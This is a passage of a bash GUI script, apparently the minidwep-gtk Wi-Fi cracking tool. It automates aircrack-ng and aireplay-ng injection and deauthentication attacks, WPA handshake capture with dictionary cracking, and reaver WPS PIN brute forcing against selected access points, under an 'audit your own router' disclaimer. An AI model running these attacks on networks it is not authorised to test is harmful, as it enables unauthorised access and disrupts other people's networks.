dg_18="拷贝握手包文件到硬盘分区吗?"
button1="_S扫描"
button2="_L启动"
button3="_A停止"
button4="_E退出"
else
msg_1="Wireless Cards"
msg_2="Channel"
msg_3="Encryption"
msg_4="Bssid"
msg_5="Essid"
msg_6="PWR"
msg_7="CH"
msg_8="ENC"
msg_9="Client"
msg_10="Mode selected"
msg_11="Injection rate"
msg_12="No action"
msg_13="_Dictionary \nAttack"
msg_14="NO wireless card found!"
msg_14a="No ap encrypted with WEP or WPA found!"
msg_15="Please select one ap"
msg_16="Please select one ap with WEP!"
msg_17="Please select one ap with WPA!"
msg_17a="IVS got:"
msg_18="Sending Authentication Request"
msg_19="Fake Authentication unsuccessful!"
msg_20="Fake Authentication successful"
msg_21="Fake Auth unsuccessful!capturing packets and waiting for a client."
msg_22="Starting aireplay-ng -2 -p 0841"
msg_22a="Aireplay-ng -2 -p 0841 successful,injecting now..."
msg_23="Starting aireplay-ng -3"
msg_23a="Aireplay-ng -3 successful,injecting now..."
msg_24="Starting aireplay-ng -4，please wait"
msg_25="aireplay-ng -4 failed"
msg_26="Aireplay-ng -4 got replay_dec.xor file!injecting now..."
msg_27="Starting aireplay-ng -5"
msg_28="aireplay-ng -5 failed"
msg_29="Aireplay-ng -5 got fragment.xor file! injecting now..."
msg_30="Starting aireplay-ng -6"
msg_30a="Aireplay-ng -6 injecting now..."
msg_31="Starting aireplay-ng -7"
msg_31a="Aireplay-ng -7 injecting now..."
msg_32="key of [$ap_mac] found: $he"
msg_33="Waiting for the four-way WPA handshake... "
msg_34="Target AP hide essid,trying fake auth with"
msg_35="Waiting for WPA handshake with $ap_mac"
msg_36="WPA handshake captured!"
msg_37="WPA KEY FOUND: $key"
msg_38="Waiting for a client..."
msg_39="Wait $sec seconds for authentication handshake!"
msg_40="No Handshake captured,Wait 60 seconds "
msg_41="Got MAC of a client"
msg_42="WPA KEY of [$ap_mac] FOUND:$key"
msg_43="No WPA key found in your dictionary"
msg_44="Trying to find key now..."
msg_45="Starting aircrack-ng to find key"
msg_46="ready to start deauthentication for aireplay-ng -3"
msg_47="No client found"
msg_48="Lanching Deauthentication attack..."
msg_49="Waiting for ARP packet"
msg_50="handshake file:/tmp/$cap_name"
msg_51="aircrack-ng started,searching key in the dictionary..."
msg_52="aircrack-ng quitted"
msg_53="No password dictionary selected!" 
msg_54="Deauthentication now" 
msg_55="Please wait a second"
msg_56="No ap with $wep_wpa found on channel $ch"
msg_57="This software is a tool to audit security of home wirless router\nIt is illegal to crack others wireless router password\nAbandon WEP,Love WPA2\nDisable WPS"
msg_58="MAC of a Client found,wait 60 seconds "
msg_59="Trying fake authentication now"
msg_60="wpa_supplicant starting"
msg_61="wpa_supplicant failed"
msg_62="No aircrack-ng found, please install aircrack-ng! "
msg_63="Channel number is not valid,click Abort, scan again！"
msg_64="Trying pin"
msg_65="Add reaver more optins here:"
msg_66="Need reaver1.4 or higher,but not found!"
msg_66a="wireless cards found"
msg_67="used"
msg_68="Pin different APs"
msg_69="Select one wirless card:"
msg_70="All wireless cards are on duty!"
msg_71="AP is being pinned now !"
msg_72="Starting monitor mode,Please wait!"
msg_73="Sort pincodes"
msg_74=" exists,overwrite it?"
msg_75="Sort pincodes in sequence u like,only 10 digit numbers accepted.\n0 means 0000-0999,1 means 1000-1999\ntype figures here:"
msg_75k="Sort pincodes in sequence u like,only 10 digit numbers accepted.0 means 0000-0999,1 means 1000-1999,type figures here:"
msg_76="File wpc is copied in"
msg_77="Interface selected is busy,choose another one!"
msg_78="Input 4 digit numbers,sequence will be n n-1 n+1 n-2 n+2..."
msg_79="Randomizing PIN code,take 5-10 minutes or more."
msg_80="Select MACs wanted to be pinned automatically,\nClick button Reaver on main window to run reaver automatically."
dg_1="$me_edition"
dg_2="WPA handshake captured. select a dictionary to searche the key?"
dg_3="No password dictionary selected! \nHere you can find WPA hadnshake:\n/tmp/$cap_name "
dg_4="_Reaver"
dg_5="Select your password dictionary"
dg_6="No key found in the dictionary! \nHere you can find WPA hadnshake:\n/tmp/$cap_name "
dg_7="select the file to be copied"
dg_8="cap file not available !"
dg_9="Select a MAC"
dg_10="file not available !"
dg_11="Select your password dictionary" 
dg_12="WPA KEY FOUND"
dg_13="Select one directory"
dg_14="file:$file_name \nhas copied successfully to\n$dir_name"
dg_15="Copy failed"
dg_16="Directory selected not available" 
dg_17="file not available ! \nSelect a file again?" 
dg_18="Want to copy handshake file to Hard Disk?"
button1="_Scan"
button2="_Lanch"
button3="_Abort"
button4="_Exit"
fi
lang=$LANG
export LANG=en
interface=`airmon-ng |grep iwlagn|grep -v 'mon\w*'|awk '{print $1}'`
export LANG=$lang
if [ -n "$interface" ];then
	ifconfig $interface down
	modprobe -r iwlagn
	modprobe iwlagn
	sleep 1
fi
[ -s "$path/dialog" ]&&dialog=`cat $path/dialog`
if [ -x /usr/local/bin/aircrack-ng -o -x /usr/bin/aircrack-ng -o -x /usr/sbin/aircrack-ng -o -x /sbin/aircrack-ng ];then
	echo "aircrack-ng installed"
else
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1" --msgbox "$msg_62"  10 40
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1" --msgbox "$msg_62"
	[ "$dialog" = "zenity" ]&&zenity --title="$dg_1" --error --text="$msg_62"
fi
reaver_installed=`which reaver`
wash_installed=`which wash`
if [ -z "$reaver_installed" -o -z "$wash_installed" ];then
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1" --msgbox "$msg_66"  10 40
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1" --msgbox "$msg_66"
	[ "$dialog" = "zenity" ]&&zenity --title="$dg_1" --error --text="$msg_66"
else
	echo "reaver 1.4 or higher installed"
fi

[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1" --msgbox "$msg_57"  10 40
[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1" --msgbox "$msg_57"
[ "$dialog" = "zenity" ]&&zenity --title="$dg_1" --error --text="$msg_57"
if [ -n "`which NetworkManager`" ];then
	sudo /etc/init.d/NetworkManager stop&
	sudo /etc/init.d/networkmanager stop&
	/etc/rc.d/rc.networkmanager stop&
fi

# Define GUI - mainwindow
define WIN gtk "u_window \"'$me_edition'\"667 400"
gtk "u_bgcolor $WIN #DBDBDB"
define cdslabel gtk "u_label \"'$msg_1'\" 100 40"
gtk "u_attach $WIN $cdslabel 5 5"
lang=$LANG
export LANG=en
airmon-ng |grep -v 'Interface' | grep -v 'mon\w*' |grep -v '^$'|grep -v "parent"|awk '{print$1}' >$path/interface
airmon-ng |grep "`head -1 $path/interface`">$tmp
export LANG=$lang
cd_info=`cat $tmp`
define cards_combo gtk "u_combo \"'`head -1 $path/interface`'\" 130 30"
gtk "u_attach $WIN $cards_combo 5 40"
define card_info gtk "u_text 130 50"
gtk "u_attach $WIN $card_info 5 70"
gtk "u_font $card_info \"'Arial 8'"\"
gtk "u_text_text $card_info \"'$cd_info'\""
gtk "u_disable $card_info"

#Channel
define ch_label gtk "u_label \"'$msg_2'\" 130 25"
gtk "u_attach $WIN $ch_label 5 115"
define ch_combo gtk "u_combo All 130 35"
gtk "u_combo_text $ch_combo \"'channel 1'\""
gtk "u_combo_text $ch_combo \"'channel 2'\""
gtk "u_combo_text $ch_combo \"'channel 3'\""
gtk "u_combo_text $ch_combo \"'channel 4'\""
gtk "u_combo_text $ch_combo \"'channel 5'\""
gtk "u_combo_text $ch_combo \"'channel 6'\""
gtk "u_combo_text $ch_combo \"'channel 7'\""
gtk "u_combo_text $ch_combo \"'channel 8'\""
gtk "u_combo_text $ch_combo \"'channel 9'\""
gtk "u_combo_text $ch_combo \"'channel 10'\""
gtk "u_combo_text $ch_combo \"'channel 11'\""
gtk "u_combo_text $ch_combo \"'channel 12'\""
gtk "u_combo_text $ch_combo \"'channel 13'\""
gtk "u_combo_text $ch_combo \"'channel 14'\""
gtk "u_attach $WIN $ch_combo 5 135"
define wep_wpa_label gtk "u_label \"'$msg_3'\" 130 25"
gtk "u_attach $WIN $wep_wpa_label 5 165"
define wep_wpa_combo gtk "u_combo WPA/WPA2 130 35"
gtk "u_combo_text $wep_wpa_combo \"'WEP'\""
gtk "u_attach $WIN $wep_wpa_combo 5 185"

define airodump_list gtk "u_list 450 180"
define airodump_label1 gtk "u_label \"'$msg_4'\" 65 40"
define airodump_label2 gtk "u_label \"'$msg_5'\" 45 40"
define airodump_label3 gtk "u_label \"'$msg_6'\" 50 40"
define airodump_label4 gtk "u_label \"'$msg_7'\" 45 40"
define airodump_label5 gtk "u_label \"'$msg_8'\" 70 40"
define airodump_label6 gtk "u_label \"'$msg_9'\" 80 40"
gtk "u_attach $WIN $airodump_label1 145 5"
gtk "u_attach $WIN $airodump_label2 240 5"
gtk "u_attach $WIN $airodump_label3 290 5"
gtk "u_attach $WIN $airodump_label4 340 5"
gtk "u_attach $WIN $airodump_label5 380 5"
gtk "u_attach $WIN $airodump_label6 500 5"
gtk "u_attach $WIN $airodump_list 145 40"

define scan_button gtk "u_button $button1 65 50 1"
gtk "u_attach $WIN $scan_button 598 40"
#gtk "u_bgcolor $ABOUT #00CC00 #009900 #00FF00"

define frame1 gtk "u_frame 130 135"
gtk "u_frame_text $frame1 \"'$msg_10'\""
[ "$distro" = "ubuntu" -o "$distro" = "TinyCore" -o "$distro" = "BT4" ]&&gtk "u_font $frame1 \"'Arial 7'"\"
gtk "u_attach $WIN $frame1 5 218" 
define mode1 gtk "u_check \"'Aireplay-ng -2'\" 130 20 "
gtk "u_attach $WIN $mode1 6 232"
define mode2 gtk "u_check \"'Aireplay-ng -3'\" 130 20 "
gtk "u_attach $WIN $mode2 6 252"
define mode3 gtk "u_check \"'Aireplay-ng -4'\" 130 20 "
gtk "u_attach $WIN $mode3 6 272"
define mode4 gtk "u_check \"'Aireplay-ng -5'\" 130 20 "
gtk "u_attach $WIN $mode4 6 292"
define mode5 gtk "u_check \"'Aireplay-ng -6'\" 130 20 "
gtk "u_attach $WIN $mode5 6 312"
define mode6 gtk "u_check \"'Aireplay-ng -7'\" 130 20 "
gtk "u_attach $WIN $mode6 6 332"
gtk "u_check_set $mode1 1"
gtk "u_check_set $mode2 1"
gtk "u_check_set $mode4 1"
gtk "u_font $mode1 \"'Arial 8'"\"
gtk "u_font $mode2 \"'Arial 8'"\"
gtk "u_font $mode3 \"'Arial 8'"\"
gtk "u_font $mode4 \"'Arial 8'"\"
gtk "u_font $mode5 \"'Arial 8'"\"
gtk "u_font $mode6 \"'Arial 8'"\"
aircrack_edition=`aircrack-ng --help|grep "Aircrack-ng 1.0"|awk '{print $3}'`
aircrack_edition0=`aircrack-ng --help|grep "Aircrack-ng 0"`
[ -z "$aircrack_edition0" -a -z "$aircrack_edition" ]&&aircrack_edition="-"
[ -n "$aircrack_edition0" ]&&aircrack_edition="rc1"

if [ "$aircrack_edition" != "rc1" -a "$aircrack_edition" != "rc2" -a -n "$aircrack_edition" ];then
	echo "aircrack-ng edition is higher than 1.0 RC2"
else
	gtk "u_disable $mode5"
	gtk "u_disable $mode6"
fi
define inject_rate_label gtk "u_label \"'$msg_11'\" 130 60"
gtk "u_attach $WIN $inject_rate_label 5 330"
define injection_combo gtk "u_combo 500 130 25"
gtk "u_font $injection_combo \"'Arial 8'"\"
gtk "u_combo_text $injection_combo \"'800'\""
gtk "u_combo_text $injection_combo \"'700'\""
gtk "u_combo_text $injection_combo \"'600'\""
gtk "u_combo_text $injection_combo \"'400'\""
gtk "u_combo_text $injection_combo \"'300'\""
gtk "u_combo_text $injection_combo \"'200'\""
gtk "u_combo_text $injection_combo \"'100'\""
gtk "u_attach $WIN $injection_combo 5 370"
gtk "u_disable $frame1"
gtk "u_disable $mode1"
gtk "u_disable $mode2"
gtk "u_disable $mode3"
gtk "u_disable $mode4"
gtk "u_disable $mode5"
gtk "u_disable $mode6"
gtk "u_hide $injection_combo"
gtk "u_hide $inject_rate_label"

define mkwpc gtk "u_button \"'$msg_73'\" 130 30"
gtk "u_attach $WIN $mkwpc 5 355"
#gtk "u_hide $mkwpc"

define ca gtk "u_canvas 450 15 gray"
gtk "u_attach $WIN $ca 145 220"
gtk "u_out \"'24'\" black gray 435 0"

define output_list gtk "u_list 450 135"
gtk "u_attach $WIN $output_list 145 240"
if [ "$lang" != "zh" ];then
	[ "$distro" = "ubuntu" -o "$distro" = "BT4" ]&&gtk "u_font $output_list \"'Arial 8'\""
fi

ti="`now_time`$msg_12"
gtk "u_list_text $output_list \"'$ti'\""
define ivs_label gtk "u_label \"'$msg_17a'\" 450 35"
gtk "u_fgcolor $ivs_label Red"
gtk "u_attach $WIN $ivs_label 150 370"

# Create buttons
define sort_mid gtk "u_button \"''\" 15 15"
gtk "u_attach $WIN $sort_mid 0 0"

define sort_random gtk "u_button \"''\" 15 15"
gtk "u_attach $WIN $sort_random 652 0"
define auto_pin gtk "u_button \"'x'\" 20 20"
gtk "u_attach $WIN $auto_pin 652 385"
gtk "u_font $auto_pin \"'Arial 8'\""

define dict_attack gtk "u_button \"'$msg_13'\" 65 45"
gtk "u_attach $WIN $dict_attack 598 100"
if [ "$lang" != "zh" ];then
	[ "$distro" = "slax" -o "$distro" = "CDlinux" -o "$distro" = "BT3" ]&&gtk "u_font $dict_attack \"'Arial 9'\""
	[ "$distro" = "ubuntu" -o "$distro" = "BT4" ]&&gtk "u_font $dict_attack \"'Arial 8'\""
	[ "$distro" = "TinyCore" ]&&gtk "u_font $dict_attack \"'Arial 9'\""
fi
#gtk "u_hide $dict_attack"
define lanch gtk "u_button $button2 65 45"
gtk "u_attach $WIN $lanch 598 160"
define reaver gtk "u_button \"'$dg_4'\" 65 45"
gtk "u_attach $WIN $reaver 598 215"
#gtk "u_hide $reaver"
define stop gtk "u_button $button3 65 45"
gtk "u_attach $WIN $stop 598 271"timer_button

define EXIT gtk "u_button $button4 65 45"
gtk "u_attach $WIN $EXIT 598 329"

#define timer1 gtk "u_label timer1 20 20"
#gtk "u_attach $WIN $timer1 598 430"
#gtk "u_hide $timer1"
#gtk "u_timeout $timer1 70000"

define timer_button gtk "u_button timer 65 30"
gtk "u_attach $WIN $timer_button 598 430"
gtk "u_hide $timer_button"

define dig gtk "u_dialog \"'$dg_1'\" \"'dialog'\" 150 100"
define dig_no_wireless_card gtk "u_dialog \"'$dg_1'\" \"'$msg_14'\" 250 100"
define dig_no_ap gtk "u_dialog \"'$dg_1'\" \"'$msg_14a'\" 350 150"
define dig_select_ap gtk "u_dialog \"'$dg_1'\" \"'$msg_15'\" 200 100"
define dig_select_wep gtk "u_dialog \"'$dg_1'\" \"'$msg_16'\" 250 100"
define dig_select_wpa gtk "u_dialog \"'$dg_1'\" \"'$msg_17'\" 250 100"

#detect wireless card $cards_combo
lang=$LANG
export LANG=en
airmon-ng |grep -v 'Interface' | grep -v 'mon\w*' |grep -v '^$'|grep -v "parent"|awk '{print$1}' >$path/interface
export LANG=$lang
if [ -s $path/interface ];then
	while read  LINE
	do
		interface=${LINE}
		echo "interface  is $interface"
		if [ "$interface" = "`head -1 $path/interface`" ];then
			echo $interface > $path/interface_sel
		else
			gtk "u_combo_text $cards_combo $interface"
		fi
	done < "$path/interface"
else
	echo "No wireless card found! "
	gtk "u_disable $WIN"
	if [ $distro != "TinyCore" ];then
		gtk "u_show $dig_no_wireless_card"
	else
		[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&Xdialog --title "$dg_1" --msgbox "$msg_14" 7 50
		[ -n "`cat $path/dialog|grep "zenity"`" ]&&zenity --info --title="$dg_1" --text="$msg_14"
		[ -n "`cat $path/dialog|grep "kdialog"`" ]&&kdialog --title "$dg_1" --msgbox "$msg_14"
		main_loop="no"
	fi
fi
#default value
echo "WPA/WPA2">$path/wep_wpa
echo "All">$path/ch
echo "off">$path/wep_on
echo "off">$path/wpa_on
echo "off">$path/aircrack_start
killall aircrack-ng aireplay-ng airodump-ng >/dev/null 2>&1
catch_singnal &

# Mainloop
if [ "$main_loop" != "no" ];then
while [[ $EVENT != $EXIT && $EVENT != $WIN ]]
do
  	define EVENT gtk "u_event"
	air=`cat $path/air_na`
	define card_selected gtk "u_combo_grab $cards_combo"
	[ -e $path/auto_pin_$card_selected ]&&gtk "u_button_text $auto_pin \"'√'\""||gtk "u_button_text $auto_pin \"'x'\""
	if [ -e $path/air_na ]; then 
		if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
			if [ -z "`ps -ef|grep -a "$air"|grep -v grep|awk '{print$1}'|head -1`" ];then
				rm -f $path/wpa_start  $path/air_na $path/disable_scan_button $path/wep_start
				echo "noaction">$path/task
			fi
		else
			if [ -z "`ps -ef|grep -a "$air"|grep -v grep|awk '{print$2}'|head -1`" ];then
				rm -f $path/wpa_start  $path/air_na $path/disable_scan_button $path/wep_start
				echo "noaction">$path/task 
			fi
		fi
	fi
	[ -e $path/interfaces_mons -a -e $path/wpa_start ]&&rm -f $path/disable_scan_button
	[ -e $path/interfaces_mons -a -e $path/wep_start ]&&rm -f $path/disable_scan_button
	[ ! -e $path/interfaces_mons -a -e $path/wpa_start ]&&echo "">$path/disable_scan_button
	[ ! -e $path/interfaces_mons -a -e $path/wep_start ]&&echo "">$path/disable_scan_button

	if [ -e $path/air_scan  ];then
		echo "">$path/disable_lanch
		echo "">$path/disable_reaver
	else 
		if [ -e $path/air_na ];then
			echo "">$path/disable_lanch
			echo "">$path/disable_scan_button
		else
			rm -f $path/disable_lanch $path/disable_reaver $path/disable_scan_button
			killall aireplay-ng
		fi
	fi
	[ -e $path/disable_lanch ]&&gtk "u_disable $lanch"||gtk "u_enable $lanch"
	[ -e $path/disable_scan_button ]&&gtk "u_disable $scan_button"||gtk "u_enable $scan_button"
	[ -e $path/disable_reaver ]&&gtk "u_disable $reaver"||gtk "u_enable $reaver"
	[ -e $path/xd ]&&gtk "u_disable $WIN"||gtk "u_enable $WIN"
				if [ -s $path/airodump_refresh ];then 
				if [ `head -1 $path/airodump_refresh` = "wep" ];then
					cat $path/airodump_output1 > $path/airodump_output
					rm -f $path/airodump_refresh
					if [ -s $path/airodump_output ];then
						gtk "u_list_clear $airodump_list"
						gtk "u_font $airodump_list \"'Arial 9'\""
						while read line
						do
							[ -n "${line}" ]&&gtk "u_list_text $airodump_list \"'$line'\""
						done <$path/airodump_output
						gtk "u_focus $airodump_list"
						[ -n `head -1 $path/list_n_wep` ]&&gtk "u_list_set $airodump_list `head -1 $path/list_n_wep`"
					fi
				elif [ `head -1 $path/airodump_refresh` = "wpa" ];then
					cat $path/airodump_output2 > $path/airodump_output
					rm -f $path/airodump_refresh
					if [ -s $path/airodump_output ];then
						gtk "u_list_clear $airodump_list"
						gtk "u_font $airodump_list \"'Arial 9'\""
						while read line
						do
							[ -n "${line}" ]&&gtk "u_list_text $airodump_list \"'$line'\""
						done <$path/airodump_output
						gtk "u_focus $airodump_list"
						[ -n `head -1 $path/list_n_wpa` ]&&gtk "u_list_set $airodump_list `head -1 $path/list_n_wpa`"
					fi
				fi
				fi
	if [ -e $path/tl ];then
		if [ -n "`which wmctrl`" ];then
			wmctrl -a "`head -1 $path/tl`"
			rm -rf $path/tl
		fi
	fi

	#if [ $EVENT = $timer1 ];then
	#	echo "timer1 is out"
	#	m_x=`head -1 $path/mouse_xy|awk '{print$1}'`
	#	m_y=`head -1 $path/mouse_xy|awk '{print$2}'`
	#	define mouse_x gtk "u_mouse 0"
	#	define mouse_y gtk "u_mouse 1"
	#	[ -z "$m_x" ]&&m_x=$mouse_x
	#	[ -z "$m_y" ]&&m_y=$mouse_y
	#	echo "$mouse_x $mouse_y">$path/mouse_xy
	#       if [ $m_x -eq $mouse_x  -a $mouse_x -ge 0 -a $mouse_x -le 5 -a "`head -1 $path/wep_wpa`" != "WEP" ];then
	#		gtk2=""
	#		define gtk2 gtk "u_list_grab $airodump_list"
	#		echo "airodump_list is ${gtk2}"
	#		gtk_No=`echo "${gtk2}"|awk '{print $1}'`
	#		if [ "${gtk2}" != "-1" -a "${gtk2}" != "0" -a "$gtk_No" != "No" ];then
	#			echo "`echo ${gtk2}|cut -c1-17` 1">$path/mkwpc
	#		fi
	#		echo "100 $mouse_y">$path/mouse_xy
	#	fi 
	#	bash /usr/local/bin/minileafdwep/auto_pin &
	#fi
	if [ $EVENT = $sort_random ];then
			gtk2=""
			define gtk2 gtk "u_list_grab $airodump_list"
			gtk_No=`echo "${gtk2}"|awk '{print $1}'`
			if [ "${gtk2}" != "-1" -a "${gtk2}" != "0" -a "$gtk_No" != "No" ];then
				echo "`echo ${gtk2}|cut -c1-17` 2">$path/mkwpc
			fi
	fi
	if [ $EVENT = $sort_mid ];then
			gtk2=""
			define gtk2 gtk "u_list_grab $airodump_list"
			gtk_No=`echo "${gtk2}"|awk '{print $1}'`
			if [ "${gtk2}" != "-1" -a "${gtk2}" != "0" -a "$gtk_No" != "No" ];then
				echo "`echo ${gtk2}|cut -c1-17` 1">$path/mkwpc
			fi
	fi
	if [ $EVENT = $auto_pin ];then
		define card_selected gtk "u_combo_grab $cards_combo"
		if [ -e $path/auto_pin_$card_selected ];then
			rm -rf $path/auto_pin_$card_selected
			gtk "u_button_text $auto_pin \"'x'\"" 
		else 
			if [ -e $path/aps_wps ];then
				define gtk2 gtk "u_list_grab $airodump_list"
				gtk_No=`echo "${gtk2}"|awk '{print $1}'`
				if [ "${gtk2}" != "-1" -a "${gtk2}" != "0" -a "$gtk_No" != "No" ];then
					mac_default=`echo ${gtk2}|cut -c1-17`
				fi
			fi		
			echo "$card_selected $mac_default">$path/auto_list
			echo "">$path/auto_pin_sel
		fi
	fi
	if [ $EVENT = $dig_no_wireless_card ];then
		break
	fi
	if [ $EVENT = $stop ];then
		gtk "u_disable $stop"
		echo "stop button pressed"
		rm -f $stdout $path/auth $path/wpa_start $tmp_2 $tmp_3 $tmp_6 $tmp_7 &
		echo "noaction">$path/task
		echo "off">$path/wpa_on
		[ -n "`ps -ef|grep "minidwep.conf"|grep -v grep`" ]&&killall wpa_supplicant
		killall aircrack-ng
		killall aireplay-ng
		killall reaver
		[ ! -e $path/interfaces_mons ]&&monitor_start
		rm -f $path/disable_scan_button $path/disable_lanch $path/disable_reaver $path/air_na
	   if [ ! -e $path/reaver_start ];then
	   	if [ -s $path/aps_clients ];then
			echo "got aps"
			gtk2=""
			define gtk2 gtk "u_list_grab $airodump_list"
			if [ "${gtk2}" = "Scanning..." ];then
				gtk "u_list_clear $airodump_list"
			fi
		else
			scan_stop
			gtk "u_list_clear $airodump_list"
			gtk "u_font $airodump_list \"'Arial 9'\""
			if [ -s $path/airodump_output ];then
				while read line
				do
					[ -n "${line}" ]&&gtk "u_list_text $airodump_list \"'${line}'\""
				done <$path/airodump_output
				if [ "`cat $path/wep_wpa`" = "WEP" ];then
					gtk "u_enable $frame1"
					gtk "u_enable $mode1"
					gtk "u_enable $mode2"
					gtk "u_enable $mode3"
					gtk "u_enable $mode4"
					aircrack_edition=`aircrack-ng --help|grep "Aircrack-ng 1.0"|awk '{print $3}'`
					aircrack_edition0=`aircrack-ng --help|grep "Aircrack-ng 0"`
					[ -z "$aircrack_edition0" -a -z "$aircrack_edition" ]&&aircrack_edition="-"
					[ -n "$aircrack_edition0" ]&&aircrack_edition="rc1"
					if [ "$aircrack_edition" != "rc1" -a "$aircrack_edition" != "rc2" -a -n "$aircrack_edition" ];then
						gtk "u_enable $mode5"
						gtk "u_enable $mode6"
					fi
				fi
				gtk "u_focus $airodump_list"
			fi
		fi
		gtk "u_list_clear $output_list"
		gtk "u_list_text $output_list \"'`now_time`$msg_12'\""
		gtk "u_label_text $ivs_label \"'$msg_17a'\""
		gtk "u_square gray 0 0 430 15 1"
	    else
			rm -f $path/reaver_start
			ap_mac=`cat $path/ap_mac`
			ap_mac_wpc=`echo $ap_mac|tr -d :`".wpc"
			if [ ! -e $path/$ap_mac_wpc ];then
				[ -s $reaver_wpc_path/$ap_mac_wpc ]&&cp -f $reaver_wpc_path/$ap_mac_wpc $path
			fi
			[ $distro = "CDlinux" ]&&cp -f $path/$ap_mac_wpc $HOME &
			[ -s $path/$ap_mac_wpc ]&&cp -f $path/$ap_mac_wpc $reaver_wpc_path&
	   fi
		echo "stop all"
		echo "off" >$path/aircrack_start
		echo "noaction">$path/task
	fi 	
		gtk "u_enable $stop"
	if [ $EVENT = $cards_combo ];then
		card_gtk=""
		define card_gtk gtk "u_combo_grab $cards_combo"
		echo "card ${card_gtk} selected"
		echo ${card_gtk} >$path/interface_sel
		lang=$LANG
		export LANG=en
		airmon-ng |grep "`head -1 $path/interface_sel`">$tmp_card
		export LANG=$lang
		gtk "u_text_clear $card_info"
		cd_info=`cat $tmp_card`
		gtk "u_text_text $card_info \"'$cd_info'\""
		gtk "u_font $card_info \"'Arial 8'"\"
		gtk "u_disable $card_info"
	fi
	if [ $EVENT = $mkwpc ];then
		gtk2=""
		define gtk2 gtk "u_list_grab $airodump_list"
		echo "airodump_list is ${gtk2}"
		gtk_No=`echo "${gtk2}"|awk '{print $1}'`
		if [ "${gtk2}" != "-1" -a "${gtk2}" != "0" -a "$gtk_No" != "No" ];then
			echo "`echo ${gtk2}|cut -c1-17` 0" >$path/mkwpc
		fi		
	fi
	if [ $EVENT = $reaver ];then
		rm -f $path/reaver_pin $path/reaver_done
		echo "">$path/reaver_start
		gtk "u_disable $lanch"
		gtk "u_disable $scan_button"
		gtk "u_disable $reaver"
		echo "">$path/disable_lanch
		echo "">$path/disable_scan_button
		echo "">$path/disable_reaver
		card_gtk=""
		define card_gtk gtk "u_combo_grab $cards_combo"
		gtk1=${card_gtk}
		echo "cards_combo is $gtk1"
		gtk "u_focus $airodump_list"
		gtk2=""
		define gtk2 gtk "u_list_grab $airodump_list"
		echo "airodump_list is ${gtk2}"
		gtk_No=`echo "${gtk2}"|awk '{print $1}'`
		if [ "${gtk2}" != "-1" -a "${gtk2}" != "0" -a "$gtk_No" != "No" ];then
			rm -f $stdout
			echo ${gtk2}|cut -c1-17 >$path/ap_mac
			wep_wpa=$(head -1 $path/wep_wpa|grep -a "WPA")
			ap_mac=`cat $path/ap_mac`
			ap_wpa=`cat $path/aps|grep -a $ap_mac|grep WPA`
			ap_wep=`cat $path/aps|grep -a $ap_mac|grep WEP`
				#if [ -n "$wep_wpa" -a -n "$ap_wpa" ];then
					echo "Starting reaver attack"
					echo "on">$path/reaver_on
					echo "14">$path/task
				#fi
		else
			gtk "u_show $dig_select_ap"
			echo "">$path/xd
			echo "noaction">$path/task
		fi
		[ -e $path/interfaces_mons ]&&rm -f $path/disable_scan_button  $path/disable_reaver
	fi 
	if [ $EVENT = $lanch ];then
		echo "lanch pressed"
		rm -f $tmp_2 $tmp_3
		gtk "u_disable $lanch"
		gtk "u_disable $reaver"
		gtk "u_disable $scan_button"
		echo "">$path/disable_lanch
		echo "">$path/disable_scan_button
		echo "">$path/disable_reaver
		gtk "u_label_text $ivs_label \"'$msg_17a '\""
		rm -f $stdout $path/keyfound $path/scan*
		killall airodump-ng
		killall aireplay-ng
		killall aircrack-ng
		card_gtk=""
		define card_gtk gtk "u_combo_grab $cards_combo"
		gtk1=${card_gtk}
		echo "cards_combo is $gtk1"
		gtk "u_focus $airodump_list"
		gtk2=""
		define gtk2 gtk "u_list_grab $airodump_list"
		echo "airodump_list is ${gtk2}"
		gtk_No=`echo "${gtk2}"|awk '{print $1}'`
		if [ "${gtk2}" != "-1" -a "${gtk2}" != "0" -a "$gtk_No" != "No" ];then
			rm -f $stdout
			echo ${gtk2}|cut -c1-17 >$path/ap_mac
			wep_wpa=$(head -1 $path/wep_wpa|grep -a "WPA")
			ap_mac=`cat $path/ap_mac`
			ap_wpa=`cat $path/aps|grep -a $ap_mac|grep WPA`
			ap_wep=`cat $path/aps|grep -a $ap_mac|grep WEP`
				if [ -n "$wep_wpa" -a -n "$ap_wpa" ];then
					echo "Starting WPA attack"
					echo "on">$path/wpa_on
					echo "">$path/wpa_start
					echo "14">$path/task
					#echo "">$path/air_na
					if [ -e $path/interfaces_mons ];then
						rm -f $path/disable_reaver $path/disable_scan_button
					fi
				else
					if [ -z "$wep_wpa" -a -n "$ap_wep" ];then
						echo "Starting WEP attack"
						gtk "u_combo_grab $injection_combo"
						echo "$GTK">$path/injection_rate
						rm -f $path/at_mode
						gtk "u_check_get $mode1 "
						[ $GTK -eq 1 ]&&echo "2">$path/at_mode
						gtk "u_check_get $mode2 "
						[ $GTK -eq 1 ]&&echo "3">>$path/at_mode
						gtk "u_check_get $mode3 "
						[ $GTK -eq 1 ]&&echo "4">>$path/at_mode
						gtk "u_check_get $mode4 "
						[ $GTK -eq 1 ]&&echo "5">>$path/at_mode
						gtk "u_check_get $mode5 "
						[ $GTK -eq 1 ]&&echo "6">>$path/at_mode
						gtk "u_check_get $mode6 "
						[ $GTK -eq 1 ]&&echo "7">>$path/at_mode
						if [ -z "`cat $path/at_mode`" ];then
							gtk "u_check_set $mode1 1"
							echo "2">$path/at_mode
						fi
						echo "on">$path/wep_on
						echo "14">$path/task
						echo "">$path/air_na
					else
						if [ -z "$ap_wpa" -a -n "$ap_wep" ];then
							gtk "u_show $dig_select_wpa"
							gtk "u_disable $WIN"
						else
							if [ -z "$ap_wpa" -a -z "$ap_wep" ];then
								gtk "u_show $dig_select_ap"
								gtk "u_disable $WIN"
							else
								gtk "u_show $dig_select_wep"
								gtk "u_disable $WIN"
							fi
						fi
						echo "noaction">$path/task
						echo "">$path/xd
					fi	
				fi
		else
			gtk "u_show $dig_select_ap"
			echo "">$path/xd
			echo "noaction">$path/task
		fi
		gtk "u_timeout $timer_button 100"
		echo "off">$path/aircrack_on
	fi 
	if [ $EVENT = $dig_select_ap ];then
		rm -f $path/xd
		gtk "u_enable $WIN"
		gtk "u_hide $dig_select_ap"
